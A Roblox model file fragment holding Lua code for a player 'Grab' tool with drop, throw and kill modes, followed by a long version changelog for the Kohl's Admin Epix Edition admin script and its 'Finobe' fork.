function weld(w, p, p1, a, b, c, x, y, z)
w.Parent = p
w.Part0 = p
w.Part1 = p1
w.C1 = CFrame.fromEulerAnglesXYZ(a,b,c) * CFrame.new(x,y,z)
end

function mesh(mesh, parent, x, y, z, type)
mesh.Parent = parent
mesh.Scale = Vector3.new(x, y, z)
mesh.MeshType = type
end

function remgui()
	for _,v in pairs(me.PlayerGui:GetChildren()) do
		if v.Name == "Modeshow" then
			v:remove()
		end
	end
end

function inform(text,delay)
	remgui()
	local sc = Instance.new("ScreenGui")
	sc.Parent = me.PlayerGui
	sc.Name = "Modeshow"
	local bak = Instance.new("Frame",sc)
	bak.BackgroundColor3 = Color3.new(1,1,1)
	bak.Size = UDim2.new(0.94,0,0.1,0)
	bak.Position = UDim2.new(0.03,0,0.037,0)
	bak.BorderSizePixel = 0
	local gi = Instance.new("TextLabel",sc)
	gi.Size = UDim2.new(0.92,0,0.09,0)
	gi.BackgroundColor3 = Color3.new(0,0,0)
	gi.Position = UDim2.new(0.04,0,0.042,0)
	gi.TextColor3 = Color3.new(1,1,1)
	gi.FontSize = "Size12"
	gi.Text = text
	coroutine.resume(coroutine.create(function()
		wait(delay)
		sc:remove()
	end))
end

if char:findFirstChild("Bricks",true) then
	char:findFirstChild("Bricks",true):remove()
end

bricks = Instance.new("Model",me.Character)
bricks.Name = "Bricks"

--Parts-------------------------Parts-------------------------Parts-------------------------Parts----------------------

rarm = char:findFirstChild("Right Arm")
larm = char:findFirstChild("Left Arm")
lleg = char:findFirstChild("Left Leg")
torso = char:findFirstChild("Torso")
hum = char:findFirstChild("Humanoid")

righthold = Instance.new("Part")
prop(righthold, bricks, false, 1, 0, 0.1, 0.1, 0.1, "White", false, "Custom")
w11 = Instance.new("Weld")
weld(w11, rarm, righthold, 0, 0, 0, 0, 1, 0)

lefthold = Instance.new("Part")
prop(lefthold, bricks, false, 1, 0, 0.1, 0.1, 0.1, "White", false, "Custom")
w12 = Instance.new("Weld")
weld(w12, larm, lefthold, 0, 0, 0, 0, 1, 0)

hold = Instance.new("Part")
prop(hold, bricks, false, 0, 0, 0.2, 0.4, 0.7, "Black", false, "Custom")
oh = Instance.new("Weld")
weld(oh, lleg, hold, -math.pi/1.4, 0, math.rad(35), 0.55, -0.9, 0.3)

knife = Instance.new("Part")
prop(knife, bricks, false, 0, 0, 0.35, 1.1, 0.5, "Reddish brown", false, "Custom")
orr = Instance.new("Weld")
weld(orr, hold, knife, 0, 0, 0, 0, 0.7, 0)
ar = Instance.new("Weld")
weld(ar, lefthold, nil, math.pi/2, 0, math.pi, 0, 0, 0)


blade = Instance.new("Part")
prop(blade, bricks, false, 0, 0, 0.1, 1.5, 0.4, "Medium grey", false, "Custom")
Instance.new("BlockMesh",blade).Scale = Vector3.new(0.3,1,1)
w2 = Instance.new("Weld")
weld(w2, knife, blade, 0, 0, 0, 0, -1.2, 0)

blade2 = Instance.new("Part")
prop(blade2, bricks, false, 0, 0, 0.1, 0.5, 0.4, "Medium grey", false, "Custom")
local mew = Instance.new("SpecialMesh",blade2)
mew.MeshType = "Wedge"
mew.Scale = Vector3.new(0.3,1,1)
w3 = Instance.new("Weld")
weld(w3, blade, blade2, 0, 0, 0, 0, -1, 0)




rb = Instance.new("Part")
prop(rb, bricks, false, 1, 0, 0.1, 0.1, 0.1, "White", false, "Custom")
w13 = Instance.new("Weld")
weld(w13, torso, rb, 0, 0, 0, -1.5, -0.5, 0)

lb = Instance.new("Part")
prop(lb, bricks, false, 1, 0, 0.1, 0.1, 0.1, "White", false, "Custom")
w14 = Instance.new("Weld")
weld(w14, torso, lb, 0, 0, 0, 1.5, -0.5, 0)

rw = Instance.new("Weld")
weld(rw, rb, nil, 0, 0, 0, 0, 0.5, 0)

lw = Instance.new("Weld")
weld(lw, lb, nil, 0, 0, 0, 0, 0.5, 0)

grabweld = nil
platlol = nil
lolhum = nil

function touch(h)
	if hurt then
		if grabbed == nil then
			local hu = h.Parent:findFirstChild("Humanoid")
			local head = h.Parent:findFirstChild("Head")
			local torz = h.Parent:findFirstChild("Torso")
			if hu ~= nil and head ~= nil and torz ~= nil and h.Parent.Name ~= name then
				if hu.Health > 0 then
				grabbed = torz
				hu.PlatformStand = true
				local w = Instance.new("Weld")
				weld(w,righthold,grabbed,math.pi/2,0.2,0,0.7,-0.9,-0.6)
				grabweld = w
				lolhum = hu
				local lolxd = true
				platlol = lolxd
				hu.Changed:connect(function(prop)
					if prop == "PlatformStand" and platlol then
						hu.PlatformStand = true
					end
				end)
				end
			end
		end
	end
end

righthold.Touched:connect(touch)
lefthold.Touched:connect(touch)

function bleed(part,po)
	local lol1 = math.random(5,30)/100
	local lol2 = math.random(5,30)/100
	local lol3 =math.random(5,30)/100
	local lol4 = math.random(1,#bloodcolors)
	local p = Instance.new("Part")
	prop(p,part.Parent,false,0,0,lol1,lol2,lol3,bloodcolors[lol4],false,"Custom")
	p.CFrame = part.CFrame * CFrame.new(math.random(-5,5)/10,po,math.random(-5,5)/10)
	p.Velocity = Vector3.new(math.random(-190,190)/10,math.random(-190,190)/10,math.random(-190,190)/10)
	p.RotVelocity = Vector3.new(math.random(-400,400)/10,math.random(-400,400)/10,math.random(-400,400)/10)
	coroutine.resume(coroutine.create(function()
		wait(3)
		p:remove()
	end))
end

if script.Parent.className ~= "HopperBin" then
	h = Instance.new("HopperBin",me.Backpack)
	h.Name = "Grab"
	script.Parent = h
end

bin = script.Parent

function select(mouse)
	orr.Part1 = nil
	ar.Part1 = knife
	mouse.Button1Down:connect(function()
		if attacking == false then
			attacking = true
			lw.Part1 = larm
			rw.Part1 = rarm
			hurt = true
			for i=1, 8 do
				rw.C0 = rw.C0 * CFrame.new(-0.03,0,-0.08) * CFrame.fromEulerAnglesXYZ(0.18,0.04,0)
				lw.C0 = lw.C0 * CFrame.new(0.06,0,-0.06) * CFrame.fromEulerAnglesXYZ(0.15,-0.11,-0.05)
				wait()
			end
			wait(1)
			hurt = false
			if grabbed == nil then
				for i=1, 4 do
					rw.C0 = rw.C0 * CFrame.new(0.06,0,0.16) * CFrame.fromEulerAnglesXYZ(-0.36,-0.08,0)
					lw.C0 = lw.C0 * CFrame.new(-0.12,0,0.12) * CFrame.fromEulerAnglesXYZ(-0.3,0.22,0.05)
					wait()
				end
				lw.C0 = CFrame.new(0,0,0)
				rw.C0 = CFrame.new(0,0,0)
				lw.Part1 = nil
				rw.Part1 = nil
				attacking = false
			end
		elseif hurt == false and grabbed ~= nil and mode == "drop" then
			grabweld:remove()
			grabweld = nil
			platlol = false
			grabbed = nil
			lolhum.PlatformStand = false
			lolhum = nil
			for i=1, 4 do
				rw.C0 = rw.C0 * CFrame.new(0.06,0,0.16) * CFrame.fromEulerAnglesXYZ(-0.36,-0.08,0)
				lw.C0 = lw.C0 * CFrame.new(-0.12,0,0.16) * CFrame.fromEulerAnglesXYZ(-0.3,0.2,0)
				wait()
			end
			lw.C0 = CFrame.new(0,0,0)
			rw.C0 = CFrame.new(0,0,0)
			lw.Part1 = nil
			rw.Part1 = nil
			attacking = false
			platlol = nil
		elseif hurt == false and grabbed ~= nil and grabweld ~= nil and mode == "throw" then
			grabweld:remove()
			grabweld = nil
			local bf = Instance.new("BodyForce",grabbed)
			bf.force = torso.CFrame.lookVector * 8500
			bf.force = bf.force + Vector3.new(0,7400,0)
			coroutine.resume(coroutine.create(function()
				wait(0.12)
				bf:remove()
			end))
			for i=1, 6 do
				rw.C0 = rw.C0 * CFrame.new(0,0,0) * CFrame.fromEulerAnglesXYZ(0.35,0,0)
				lw.C0 = lw.C0 * CFrame.new(0,0,0) * CFrame.fromEulerAnglesXYZ(-0.18,0,0)
				wait()
			end
			for i=1, 4 do
				rw.C0 = rw.C0 * CFrame.new(0,0,0) * CFrame.fromEulerAnglesXYZ(-0.47,0,0)
				lw.C0 = lw.C0 * CFrame.new(0,0,0) * CFrame.fromEulerAnglesXYZ(0.2,0,0)
				wait()
			end
			wait(0.2)
			platlol = false
			grabbed = nil
			lolhum.PlatformStand = false
			lolhum = nil
			for i=1, 4 do
				rw.C0 = rw.C0 * CFrame.new(0.06,0,0.16) * CFrame.fromEulerAnglesXYZ(-0.36,-0.08,0)
				lw.C0 = lw.C0 * CFrame.new(-0.12,0,0.16) * CFrame.fromEulerAnglesXYZ(-0.3,0.2,0)
				wait()
			end
			lw.C0 = CFrame.new(0,0,0)
			rw.C0 = CFrame.new(0,0,0)
			lw.Part1 = nil
			rw.Part1 = nil
			attacking = false
			platlol = nil
		elseif hurt == false and grabbed ~= nil and lolhum ~= nil and grabweld ~= nil and mode == "kill" then
			for i=1, 5 do
				lw.C0 = lw.C0 * CFrame.new(0.02,0.12,0.1) * CFrame.fromEulerAnglesXYZ(-0.05,0,-0.03)
				wait()
			end
			local ne = grabbed:findFirstChild("Neck")
			coroutine.resume(coroutine.create(function()
				local duh = grabbed
				local duh2 = grabbed.Parent.Head
				local lolas = lolhum
				duh.RotVelocity = Vector3.new(math.random(-20,20),math.random(-20,20),math.random(-20,20))
				for i=1, 60 do
					wait()
					local hm = math.random(1,9)
					pcall(function()
						if hm == 1 then
							duh2.Sound.Pitch = math.random(90,110)/100
							duh2.Sound:play()
						end
					end)
					if hm > 0 and hm < 3 then
						bleed(duh,1)
						bleed(duh2,-0.5)
					end
				end
				lolas.Health = 0
				for i=1, 85 do
					wait()
					local hm = math.random(1,9)
					pcall(function()
						if hm == 1 then
							duh2.Sound.Pitch = math.random(90,110)/100
							duh2.Sound:play()
						end
					end)
					if hm > 0 and hm < 3 then
						bleed(duh,1)
						bleed(duh2,-0.5)
					end
				end
			end))
			for i=1, 3 do
				lw.C0 = lw.C0 * CFrame.new(0.02,0.12,0.1) * CFrame.fromEulerAnglesXYZ(-0.05,0,-0.03)
				if ne ~= nil then
					grabbed.Neck.C0 = grabbed.Neck.C0 * CFrame.fromEulerAnglesXYZ(-0.35,0,0)
				end
				wait()
			end
			grabweld:remove()
			grabweld = nil
			for i=1, 4 do
				lw.C0 = lw.C0 * CFrame.new(-0.04,-0.24,-0.2) * CFrame.fromEulerAnglesXYZ(0.1,0,0.06)
				wait()
			end
			for i=1, 4 do
				rw.C0 = rw.C0 * CFrame.new(0.06,0,0.16) * CFrame.fromEulerAnglesXYZ(-0.36,-0.08,0)
				lw.C0 = lw.C0 * CFrame.new(-0.12,0,0.12) * CFrame.fromEulerAnglesXYZ(-0.3,0.22,0.05)
				wait()
			end
			lw.C0 = CFrame.new(0,0,0)
			rw.C0 = CFrame.new(0,0,0)
			lw.Part1 = nil
			rw.Part1 = nil
			platlol = false
			grabbed = nil
			lolhum = nil
			attacking = false
			platlol = nil
		end
	end)
	mouse.KeyDown:connect(function(kai)
		key = kai:lower()
		if key == "q" then
			mode = "drop"
			inform("Mode: Drop",2)
		elseif key == "e" then
			mode = "throw"
			inform("Mode: Throw",2)
		elseif key == "f" then
			mode = "kill"
			inform("Mode: Kill",2)
		end
	end)
end

function desel()
	repeat wait() until attacking == false
	orr.Part1 = knife
	ar.Part1 = nil
end

bin.Selected:connect(select)
bin.Deselected:connect(desel)

char.Humanoid.Died:connect(function()
	pcall(function()
		grabweld:remove()
		grabweld = nil
		grabbed = nil
		platlol = false
		platlol = nil
	end)
end)

inform("Grab script loaded succesfully.",2)
]]></ProtectedString>
					</Properties>
				</Item>
			</Item>
			<Item class="ModuleScript" referent="RBXF892B9DD56704BD791C3EA07E725DF3B">
				<Properties>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">Change Log</string>
					<string name="ScriptGuid"></string>
					<ProtectedString name="Source"><![CDATA[return {
	'VERSION:'; 
	'-Removed';
	'+Added';
	'*Changed/Fixed';
	'!Important'; 
	'(?)Not fully confirmed';
	'';
	'Finobe19:';
	'*fixed some dumb stuff, making the script boot up faster and less jankily';
	'!below offer is still available, btw. nobody reads these LOL (after a few months, someone finally took the offer)';
	'';
	'Finobe18:';
	'*asset id format was switched from http://www.mulrbx.com/asset/?id= to http://unixfr.xyz/asset/?id=';
	'*by extension, the shirt/pants/whatever commands now work with finobe ids';
	'!does anyone even read these? first one to pm guy5f about this gets 300 dius (no longer available)';
	'';
	'Finobe17:';
	'+better capes with multiple polygons! (bettercape/cape2)'; 
	'';
	'Finobe16:';
	'!this update will probably be the big motherfucker of all my updates to epix. 7 new commands';
	'+3 new commands for data persistence manipulation! theyre all only usable by owners since otherwise normal admins could set perma-bans. (saveboolean, savenumber, savestring)';
	'+2 new chams commands! (chams, unchams)';
	'+new animation command! (animation)';
	'+wiimote (wiimote)'; 
	'';
	'Finobe15:';
	'-ray removed some of the donor garbage i never got around to removing';
	'';
	'Finobe14:';
	'+Command for creating new teams! (newteam/addteam)';
	'*text edits!! that was unexpected, right?';
	'';
	'Finobe13:';
	'*fixed noclip (the non-fly one) but due to the way it works its still pretty janky';
	'';
	'Finobe12:';
	'*fixed kidnap not working after 1 use';
	'-removed sounds from the kidnap van since they were kinda goofy despite the ominous tone';
	'*set trello to false by default and removed the hidden ban list because universal bans in admin scripts are retarded';
	'*Some EPIC text edits!! again';
	'';
	'Finobe11:';
	'+Kidnap command added';
	'*Some EPIC text edits!!';
	'';
	'Finobe10:';
	'*Im retarded and made a typo in the dex command. Fixed!';	
	'';
	'Finobe9:';
	'+Powerful new explorer GUI! (explorer/dex)';
	'+2 new special kill commands! (witchtrial & smite)';
	'*:explorer renamed to :oldexplorer since it is obsoleted by dex';
	'!at some point i will add the kidnap command from adonis but its script relies way too much on features that came after 2016';
	'';
	'Finobe8:';
	'*Reduced permission levels on the log/list commands';
	'*Text edits';
	'';
	'Finobe7:';
	'*Tweaks to some command permissions.';
	'*Fixes to a very specific issue.';
	'*Autoupdater disabled by default since im not entirely sure it works as intended';
	'*Text edits';
	'+Calling all gamers: Rise up with the all new command: gamer/gameify/riseup!';
	'!this update is dumb, so the autoupdater should just ignore this.';
	'';
	'Finobe6:';
	'*Minor edits to some text.';
	'*Fixes to hopefully make this work on the new x64 servers. Thx for pointing out the issue ray';
	'';
	'Finobe5:';
	'*Minor edits to some text.';
	'!The autoupdater will not update to this version if a server is on Finobe4 as this is pretty much a useless update.';
	'';
	'Finobe4:';
	'*F3X can no longer move locked parts';
	'*Also albert did something else but i cant be bothered to look at what it does specifically';
	'!Wow, albert is way more competent than I am! (2)';
	'';
	'Finobe3:';
	'+Autoupdate';
	'*Brickbattle weapons are now created entirely from scripts';
	'!Wow, albert is way more competent than I am!';
	'';
	'Finobe2:';
	'-Char and unchar were removed since they relied on a deprecated feature and crashed servers (thx to desuu for telling me)';
	'+New alternative command for brickbattle weapons: weps';
	'';
	'Finobe1:';
	'*Bug fixes (trello and F3X)';
	'+Laser pointer! (laser/lpointer/laserpointer)';
	'+Classic brickbattle weapons! (weapons/bweapons/classicweapons)';
	'!Albertlatin did all the stuff this update lol';
	'';
	'!Important! All versions below are from the script as it existed on ROBLOX.';
	'525:';
	'*Bug fixes';
	'!Due to irl and non-roblox things/project updates will be less frequent for a bit';
	'';
	'524:';
	'*Bug fixes';
	'';
	'523:';
	'*Bug fixes';
	'';
	'522:';
	'+ViewKeyBinds command';
	'';
	'521:';
	'*Bug fixes';
	'';
	'520:';
	'*Bug fixes';
	'+Custom Key Binds';
	'+!bind command';
	'+CustomKeyBinds setting';
	'!Thanks to GloriedRage for reminding me to add custom key binds!';
	'';
	'519:';
	'*Minor updates';
	'*Bug fixes';
	'+SeparatedChannels setting for CustomChat';
	'';
	'518:';
	'*Bug fixes';
	'';
	'517:';
	'*Minor updates';
	'';
	'516:';
	'*Bug fixes';
	'+Tove Lo - Habits in built in music list';
	'';
	'515:';
	'*Fixed a bug in the resize command';
	'';
	'514:';
	'*Bug fixes';
	'';
	'513:';
	'*Bug fixes';
	'+FriendAdminType setting';
	'*Can now have mutliple VIP items';
	'!Anyone using VIP items must update to continue using them';
	'-Removed !getvip command';
	'-Removed VipItem and VipAdminType settings';
	'+VipItems table (setting)';
	'!Recent ROBLOX updates seem to have broken the normal noclip further';
	'!I am aware of the problem with the normal noclip, and am thinking of a fix';
	'!Until the normal noclip is fixed, :flynoclip should work fine';
	'';
	'512:';
	'*Bug fixes';
	'';
	'511:';
	'*Console no longer automatically inputs the prefix';
	'';
	'510:';
	'*Bug fixes';
	'';
	'509:';
	'*Minor updates';
	'';
	'508:';
	'*Minor updates';
	'*Bug fixes';
	'*Fixed rank banning';
	'';
	'507:';
	'*Bug fixes';
	'';
	'506:';
	'*Disabled command comfirmation by default';
	'';
	'505:';
	'*Minor visual changes to the custom chat';
	'';
	'504:';
	'*Minor changes';
	'';
	'503:';
	'*Corrected something I neglected to revert from testing';
	'';
	'502:';
	'*Minor donor system changes';
	'';
	'501:';
	'!New update ideas from GloriedRage';
	'+removeguis command';
	'+VoteKick setting';
	'+VoteKickPercentage setting';
	'+votekick command';
	'+votekicks command';
	'+CommandComfirmation setting';
	'+CommandComfirmation';
	'+Filters for commands (search "Fun" or "Owner" or "Fun-Admin" etc etc)';
	'+playerlist enable/disable command';
	'!Published a plugin that should add compatibility for Scripth\'s custom chat, find it in my models!';
	'';
	'500:';
	'!Half way to version 1K! #HalfWayTo1K';
	'*Bug fixes';
	'';
	'499:';
	'*Bug fixes';
	'';
	'498:';
	'*Bug fixes';
	'*Can now preset waypoints';
	'';
	'497:';
	'*Fixed a typo.... "Donor perk are disabled in settings"';
	'';
	'496:';
	'*Minor updates';
	'';
	'495:';
	'*Bug fixes';
	'';
	'494:';
	'*Bug fixes';
	'';
	'493:';
	'*Bug fixes';
	'';
	'492:';
	'*Bug fixes';
	'';
	'491:';
	'*Bug fixes';
	'';
	'490:';
	'+:hatpets command';
	'+!pets command';
	'';
	'489:';
	'*Bug fixes';
	'';
	'488:';
	'*Bug fixes';
	'*Minor updates';
	'';
	'487:';
	'*Added a thing saying to put tools in ServerStorage at the top of the script';
	'*Minor updates to crash and netlag';
	'';
	'486:';
	'*Bug fixes';
	'(?) Narnia';
	'';
	'485:';
	'*Bug fixes';
	'';
	'484:';
	'*Bug fixes';
	'*Teleport now supports coords';
	'+Added rename to Explorer';
	'*Changed some minor stuff in the explorer gui';
	'*Changelog is now kept in a module script';
	'';
	'483:';
	'-Removed DonorBongos setting';
	'Bug fixes';
	'';
	'482:';
	'*Phase death bug fixed (?)';
	'*Bug fixes';
	'*Console now only shows commands the user has access to';
	'*Lowered console lag';
	'';
	'481:';
	'*Phase now works with filtering';
	'+UnPhase command';
	'*Bug fixes';
	'';
	'480:';
	'*Bug fixes';
	'';
	'479:';
	'*Bug fixes';
	'!Thanks to kindnesslord for bringing a bug to my attention';
	'';
	'478:';
	'*Bug fixes';
	'';
	'477:';
	'*Minor updates';
	'';
	'476:';
	'*Minor updates';
	'';
	'475:';
	'*Bug fixes';
	'';
	'474:';
	'*Bug fixes';
	'';
	'473:';
	'*Bug fixes';
	'';
	'472:';
	'*Bug fixes';
	'*Changed the wait before kicking a player if client does not respond on join to 30 seconds to account for laggy players/games';
	'*Various client loading improvements';
	'';
	'471:';
	'*Bug fixes';
	'';
	'470:';
	'*Minor updates';
	'*Bug fixes';
	'';
	'469:';
	'+Exploit logs';
	'*Bug fixes';
	'-Removed player specific log tables (no reason to have them, just use the search bar)';
	'';
	'468:';
	'*Made the anti speed less bypassable/risky';
	'!Thanks go to Scripth (Kohltastrophe) for showing me an interesting way to prefent bypasses in the anti speed';
	'';
	'467:';
	'+Made F3X into a hopperbin and added it to btools';
	'!Thanks to GigsD4X and the F3X team for the F3X tool, full credit to them.';
	'*Bug fixes';
	'';
	'466:';
	'*Minor updates';
	'*Added some ascii stuff at the bottom of the script, bcuz why not lol';
	'*Bug fixes';
	'';
	'465:';
	'*Added more versions to look for in AntiCheatEngine';
	'';
	'464:';
	'*Font is set to Arial if its not a usable font to avoid gui bugs';
	'*Bug fixes';
	'*List GUIs now show amount of items at bottom of list';
	'';
	'463:';
	'+AntiCheatEngine setting in AntiExploit';
	'';
	'462:';
	'*Bug fixes';
	'+Untrack commands';
	'*Minor changes';
	'';
	'461:';
	'*Bug fixes';
	'+Track command';
	'+vibrate command, special thanks to Scripth';
	'';
	'460:';
	'*Bug fixes';
	'';
	'459:';
	'*Clicking the KE in the help gui prompts the player to grab the script';
	'';
	'458:';
	'*Bug fixes';
	'';
	'457:';
	'*Bug fixes';
	'';
	'456:';
	'*Bug fixes';
	'';
	'455:';
	'*AntiSpeed enabled by default';
	'';
	'454:';
	'+waypoints/checkpoints (lets you set positions you can later teleport to)';
	'';
	'453:';
	'*Updated name to Kohl\'s Admin [Epix Edition]';
	'';
	'452:';
	'*Bug fixes';
	'';
	'451:';
	'*Updated the descriptions for :cs and :ls, left in the script incase something changes in the future';
	'!As of recent roblox updates, client side loadstring no longer works, as such can no longer use commands like :ls and :cs';
	'*Removed some more loadstring dependencies';
	'*Bug fixes';
	'';
	'450:';
	'*Bug fixes';
	'';
	'449:';
	'*Bug fixes';
	'';
	'448:';
	'*Bug fixes';
	'';
	'447:';
	'*DonorStuff has been changed to DonorPerks';
	'+New donor only commands';
	'+!fire, !sparkles, !light, !unfire, !unlight, !unsparkles';
	'';
	'446:';
	'*Donations are no longer split, players pay once and get access to the custom cape stuff';
	'';
	'445:';
	'*Updated how the little hint hover gui thing is used';
	'+Added command descriptions, hover over commands to view them';
	'*Added more help/hints/descriptions for the hint hover things in list guis';
	'';
	'444:';
	'Donor list only shows donors that are in-game';
	'';
	'443:';
	'+AntiDecals setting';
	'+AntiSound setting';
	'';
	'442:';
	'*Updated and example';
	'';
	'441:';
	'*Bug fixes';
	'*Minor code changes';
	'';
	'440:';
	'*Added a bot limit of 50 per run of the command, meaning if you do :bot me 100 it will only spawn 50';
	'';
	'439:';
	'*Bug fixes';
	'*Moved Scroll Windows down for new ROBLOX chat position';
	'*Special thanks to KonigFrederickll for reporting a bug';
	'';
	'438:';
	'*Bug fixes';
	'';
	'437:';
	'*Bug fixes';
	'';
	'436:';
	'*Bug fixes';
	'';
	'435:';
	'*Bug fixes';
	'';
	'434:';
	'*Bug fixes';
	'*Gui Updates';
	'';
	'433:';
	'*Fixed a bug causing the script to not work correctly in solo mode';
	'*Fixed console lag';
	'*Bug fixes';
	'';
	'432:';
	'+Spooky Scarey Skeletons song';
	'';
	'431:';
	'-Removed NoTalk setting';
	'';
	'430:';
	'*Bug fixes to detection,';
	'';
	'429:';
	'*Script now uses Google to check if Http is enabled';
	'+Http added to server details';
	'*Visual updates to the donation gui';
	'+RenameGameObjects setting in AntiExploit';
	'+Detection setting in AntiExploit';
	'+Detection of the currently leaked Stigma exploit';
	'*Bug fixes';
	'';
	'428:';
	'*Group admin updates';
	'*Admin list supports userId now';
	'!ALL PLACE OWNERS USING GROUP ADMIN REFER TO THE SETTINGS SECTION AS THE OLD WAY WILL LIKELY NO LONGER WORK';
	'*Admin list shows admins currently in the game';
	'';
	'427:';
	'*Fixed a typo in the SplitKey setting decription';
	'+Added a section to settings for prefix/split/bind keys';
	'';
	'426:';
	'+timeban command';
	'*Bug fixes';
	'*Chat bubble updates';
	'';
	'425:';
	'+AntiScriptsDisabled setting';
	'*Updated AntiNil';
	'+PlayerRemoving function';
	'*AntiExploit updates';
	'-Removed the message telling you a player tried to go nil due to bugs';
	'';
	'424:';
	'*SyncBanList setting is now Trello';
	'*Trello now supports admin lists, suggested by devSparkle';
	'!Refer to settings for new information regarding SBL/Trello';
	'';
	'423';
	'+Permissions command, suggested by Dragoloy';
	'*Bug fixes';
	'';
	'422:';
	'!Place owners apparently get money when people donate in their game! :D!!!!';
	'*Updated DonorPerks description';
	'';
	'421:';
	'*Changed how FunCommands are checked';
	'+Added 3 new admin levels for FunCommands';
	'*Place owners have access to all commands (including any donor ones)';
	'';
	'420:';
	'+DonorBongos setting';
	'!420 l0l';
	'';
	'419:';
	'*Bug fixes';
	'';
	'418:';
	'*Bug fixes';
	'';
	'417:';
	'*New song(s)';
	'';
	'416:';
	'+Resize command';
	'!Credit to Drezmor for the original resize command';
	'!Credit to Kohltastrophe for figuring out bugs in the resize and fixing it/helping to convert it';
	'';
	'415:';
	'*Made the crash less bulky and less ew looking';
	'';
	'414:';
	'*Updates to the AntiExploit';
	'*Changed how the guis look a bit';
	'';
	'413:';
	'+Added a credit thing with information about why.';
	'*Bug fixes';
	'';
	'412:';
	'*Bug fixes';
	'';
	'411:';
	'+A quote, taken from 111\'s profile';
	'';
	'410:';
	'*Minor changes';
	'!I am outraged at how people believe KohltastropheRBLX, and disapointed.';
	'';
	'409:';
	'+BodySwap command, suggested by MxLegit';
	'!Special thanks to Arlikas for being a test subject for new features/commands';
	'';
	'408:';
	'+VIPAdminType setting';
	'+Shirts usable for VIP admin';
	'';
	'407:';
	'+NerfExplosions setting (default off), semi inspired by a suggestion from TheFurryFish';
	'';
	'406:';
	'+BeardedAlien cape, suggested by LordOfFootball';
	'';
	'405:';
	'*Bug fixes';
	'*Gui Updates';
	'+Font setting';
	'+TextStrokeTransparency setting';
	'*Minor changes';
	'';
	'404:';
	'*Minor changes';
	'';
	'403:';
	'*Minor changes';
	'';
	'402:';
	'*Bug fixes';
	'*Join message off by default';
	'';
	'401:';
	'+Package related commands!';
	'+:rleg, change right leg package thing';
	'+lleg, same as rleg for left leg';
	'+rarm, same as above for right arm';
	'+larm, I hope you see the trend here';
	'+torso, same as all above but for torso';
	'';
	'400:';
	'*Bug fixes';
	'!If you have a way to make the script better be sure to message me :3';
	'';
	'399:';
	'*Name now supports health';
	"*Use :name player hide to hide a player's name";
	'';
	'398:';
	'*Bug fixes';
	'';
	'397:';
	'*Bug fixes';
	'';
	'396:';
	'*SBL Bug fixes';
	'';
	'395:';
	'*Bug fixes';
	'';
	'394:';
	'*Bug fixes';
	'*Converting some things over for if loadstring is removed';
	'-Map command';
	'-AntiNoclip, it was mostly useless.';
	'-Ragdoll command';
	'*Code changes';
	'*Cape command supports texture'; 
	'-Removed and changed most things that rely on loadstring/LoadOnClient';
	'!When/If roblox removes loadstring, all local scripting will no longer work!';
	'';
	'393:';
	'*Security updates';
	'';
	'392:';
	'*Bug fixes';
	'!Thanks go to TimelessMaster and EncryptedZ for bringing something to my attention';
	'';
	'391:';
	'*Fixed some bugs in the jail';
	'';
	'390:';
	'*Changed the message animations a bit';
	'*Countdown no longer says countdown';
	'';
	'389:';
	'*Updated stuff with crash';
	'+Unlag command (ONLY APPLIES TO PEOPLE LAGGED VIA :lag)';
	'';
	'388:';
	'*Updates with group admin code';
	'+CheckGroupAdmin function';
	'*Group admins are un-admined on leave';
	'';
	'387:';
	'*Crash is more brutal now';
	'';
	'386:';
	'*Restoremap is faster and no longer owners only (admins+)';
	'';
	'385:';
	'*Bug fixes';
	'';
	'384:';
	'*Updated the Important and Info sections';
	'';
	'383:';
	'*Bug fixes';
	'';
	'382:';
	'+clickteleport command (lets you move and rotate people to where you want, hold r to rotate)';
	'+clickwalk command (same as teleport but makes target walk to point)';
	'';
	'381:';
	'+ForceView command (good for showing people how to do stuff)';
	'';
	'380:';
	'*Bug fixes';
	'';
	'379:';
	'*Donor status on/off button shows up without custom cape';
	'*Updated the built in word list to fix a problem where people were kicked for chatting "children"';
	'';
	'378:';
	'*AntiGod enabled by default';
	'*AntiGod now kills';
	'*AntiGod checks for the god exploit on spawn';
	'*Bug fixes';
	'';
	'377:';
	'+MessageOfTheDayID setting (lets you set your own)';
	'+Added superjump as an acceptable command for nograv';
	'';
	'376:';
	'*Fixed a bug with pitch/volume in music reported by Larney';
	'';
	'375:';
	'*Bug fixes';
	'';
	'374:';
	'+Added a setting to use the old buggy string matching';
	'*Bug fixes';
	'';
	'373:';
	'*Normalify now stops crucify, cut, and puke.';
	'';
	'372:';
	'*AntiNil will disconnect players as they ar leaving if they are not an admin';
	'*AntiNil is unlikely to notify you if any non-admin goes nil as per recent updates';
	'+ExploitAlert setting';
	'*Messages about a player going nil are less likely to pop up randomly';
	'';
	'371:';
	'*Changed username to Sceleratis and changed stuff accordingly';
	'';
	'370:';
	'*Bug fixes';
	'';
	'369:';
	'*Bug Fixes';
	'';
	'368:';
	'*Bug fixes';
	'';
	'367:';
	'*Fixed a bug where you could say something like "Hello :ff me" to run :ff me';
	'';
	'366:';
	'*Bug fixes';
	'';
	'365:';
	"+Console, by default press ' to open it";
	'+ConsoleKey setting';
	'+Console setting';
	'*Bug fixes';
	'';
	'364:';
	'*MOTD on join disabled by default';
	'';
	'363:';
	'*GlitchGhost and GlitchDisorient commands now have an intensity setting';
	'';
	'362:';
	'*Updated the disclaimer';
	'+Phase commands, thanks go to Kohl for showing and sending me his phase command';
	'+motd command';
	'+Message of the day and setting for it';
	'';
	'361:';
	'+GlitchDisorient command';
	'+GlitchGhost command';
	'+UnGlitch command';
	'!The two glitch commands were inspired by a neat effect Janthran showed me';
	'';
	'360:';
	'*Made bots better';
	'-Removed PathfindingService stuff from bots';
	'The path finding is not good enough yet';
	'';
	'359:';
	'+Animations setting';
	'+MessageAnimations setting';
	'';
	'358:';
	'+FieldOfView command';
	'';
	'357:';
	'*Moved RemoteEvent to ReplicatedStorage';
	'+Funbox command, teleports people to my fun box lel';
	'';
	'356:';
	'+On/Off toggle in cape change gui for donators to disable donor status in specific games';
	'';
	'355:';
	'*Fixed ban';
	'';
	'354:';
	'+Added some on-join code to make Scripth look like his original account Kohltastrophe as per his request';
	'';
	'353:';
	'!Apparently KohltastropheRBLX re-uploaded this and managed to get nearly 20k takes off of it, qq';
	'!This script was made by Kohltastrophe(Scripth) and Sceleratis with some help now and then from einsteinK.';
	'!While I do not care if you make your own version, outright stealing this and taking full credit is not acceptable.';
	'*Code updates.';
	'';
	'352:';
	'*Updates to how scroll guis look, has more of a drop down type thing';
	'';
	'351:';
	'*SBL Updated to use Trello and HttpService';
	'!All place owners who use our exploiter list (default sbl settings) please enable Http!';
